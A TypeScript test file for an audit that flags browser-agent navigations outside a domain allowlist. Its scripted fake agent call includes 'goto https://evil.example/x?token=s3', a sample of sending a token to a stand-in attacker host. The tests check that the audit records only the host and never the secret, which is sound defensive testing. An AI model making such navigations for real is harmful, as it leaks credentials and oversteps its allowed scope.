import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { scriptedFakeAgent } from "../src/agent/fakeAgent.js";
import { createMemoryAuditSink } from "../src/browser/auditSink.js";
import type { StageBrowserSupport } from "../src/browser/browserHost.js";
import { createLocalBrowserHost } from "../src/browser/localBrowserHost.js";
import { createLocalProfileStore } from "../src/browser/localProfileStore.js";
import { resetGlobalStageflowHomeForTests } from "../src/project/globalHome.js";
import { createRunStore } from "../src/runstore/createStore.js";
import { startPipeline } from "../src/runtime/pipelineRunner.js";
import type { InlinePipelineDefinition } from "../src/types/pipeline.js";

let root: string;
const saved: Record<string, string | undefined> = {};

beforeEach(async () => {
  root = await mkdtemp(path.join(tmpdir(), "sf-aa-"));
  const manifest = path.join(root, "toolchain.json");
  await writeFile(
    manifest,
    JSON.stringify({ tools: { "agent-browser": { path: "/bin/true", version: "0.38.2" } } }),
  );
  for (const k of ["STAGEFLOW_HOME", "STAGEFLOW_TOOLCHAIN_MANIFEST"]) saved[k] = process.env[k];
  process.env.STAGEFLOW_HOME = path.join(root, "home");
  process.env.STAGEFLOW_TOOLCHAIN_MANIFEST = manifest;
  resetGlobalStageflowHomeForTests();
});
afterEach(async () => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  resetGlobalStageflowHomeForTests();
  await rm(root, { recursive: true, force: true });
});

const io = { input: { schema: { type: "object" } }, output: { schema: { type: "object" } } };
const pipeline = (browser: unknown) =>
  ({
    id: "aa",
    stages: [{ id: "work", system_prompt: "x", model: "anthropic/claude-sonnet-4-5", io, browser }],
  }) as unknown as InlinePipelineDefinition;

const toolArgs =
  "agent-browser open https://good.example/a && agent-browser goto https://evil.example/x?token=s3 && agent-browser open https://evil.example/y";
const emit = (args = toolArgs) => ({
  type: "emit" as const,
  toolArgs: args,
  envelope: { status: "success", summary: "ok", artifacts: [], payload: {} },
});

async function run(browser: unknown, opts: { failEvents?: boolean; args?: string } = {}) {
  const audit = createMemoryAuditSink();
  const support: StageBrowserSupport = {
    host: createLocalBrowserHost({ platform: "darwin", hostEnv: {}, socketRoot: path.join(root, "sock") }),
    profiles: createLocalProfileStore({ audit }),
    runner: async (args) => ({
      code: 0,
      stdout: args[1] === "cdp-url" ? "ws://127.0.0.1:41000/devtools/browser/anchor\n" : "",
    }),
    closeWaitMs: 200,
    audit,
    blockedSites: [],
  };
  const real = createRunStore({ rootDir: root });
  const store = opts.failEvents
    ? new Proxy(real, {
        get(target, prop, receiver) {
          if (prop === "listStageEvents") {
            return async (_r: string, _s: string, attempt?: number) => {
              if (attempt === undefined) throw new Error("log unreadable");
              return target.listStageEvents(_r, _s, attempt);
            };
          }
          const v = Reflect.get(target, prop, receiver);
          return typeof v === "function" ? v.bind(target) : v;
        },
      })
    : real;
  const started = await startPipeline({
    agent: scriptedFakeAgent([emit(opts.args)]),
    store,
    taskYaml: "id: t\ngoal: g\n",
    pipeline: pipeline(browser),
    cwd: root,
    executionMode: "inprocess",
    browser: support,
  } as never);
  await started.done;
  const workspace = real.getWorkspaceDir(started.runId);
  return { audit, workspace, status: (await real.readRunMeta(started.runId)).status };
}

describe("soft allowlist audit for profile stages", () => {
  it("records each outside host once, hosts only, and none for allowed hosts", async () => {
    const { audit, workspace, status } = await run({ profile: "acct", allow_domains: ["good.example"] });
    expect(status).toBe("succeeded");
    const nav = audit.records.filter((r) => r.event === "navigation_outside_allowlist");
    expect(nav).toHaveLength(1);
    expect(nav[0]).toMatchObject({ host: "evil.example", stageId: "work", profile: "acct" });
    expect(JSON.stringify(audit.records)).not.toContain("s3");
    expect(JSON.stringify(audit.records)).not.toContain("good.example");
    expect(existsSync(path.join(workspace, "stages", "work", "browser-policy.json"))).toBe(false);
  });

  it("records allowlist_unverified when the activity log cannot be read", async () => {
    const { audit } = await run({ profile: "acct", allow_domains: ["good.example"] }, { failEvents: true });
    const unverified = audit.records.filter((r) => r.event === "allowlist_unverified");
    expect(unverified).toHaveLength(1);
    expect(audit.records.some((r) => r.event === "navigation_outside_allowlist")).toBe(false);
  });

  it("writes no audit records for a profile-less stage", async () => {
    const { audit } = await run({ allow_domains: ["good.example"] });
    expect(audit.records).toEqual([]);
  });

  it("writes no navigation records when every navigation is allowed", async () => {
    const { audit } = await run(
      { profile: "acct", allow_domains: ["good.example"] },
      { args: "agent-browser open https://sub.good.example/a" },
    );
    expect(audit.records.map((r) => r.event)).toEqual(["profile_created", "profile_used"]);
  });
});
